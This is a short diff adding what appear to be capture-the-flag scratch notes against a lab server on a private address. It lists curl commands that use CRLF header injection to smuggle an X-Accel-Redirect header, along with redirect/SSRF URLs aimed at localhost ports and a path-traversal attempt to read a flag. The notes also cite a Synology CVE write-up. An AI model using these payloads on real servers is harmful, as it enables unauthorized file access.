@@ -1,0 +1,19 @@
+http://10.105.0.21:11960/
+
+curl -v 'http://10.105.0.21:11960/?redir=http://10.105.0.21:11960/flag%0d%0aX-Accel-Redirect:/flag'
+
+> GOOD TRY with CRLF Header Injection
+
+ref. https://justintaft.com/blog/cve-2021-29084-synology-crlf-unauthenticated-file-downloads
+
+curl -v '$URL/%0d%0aX-Accel-Redirect:/flag'
+curl -v '$URL/?redir=$URL/flag%0d%0aX-Accel-Redirect:/flag'
+
+> BAD
+
+http://10.105.0.21:11698/?redir=http://127.0.0.1:7777/flag
+http://10.105.0.21:11698/?redir=http://127.0.0.1:7778/flag
+
+http://10.105.0.21:11698/?redir=http://10.105.0.21:11698/flag
+
+http://10.105.0.21:11438/flag../flag
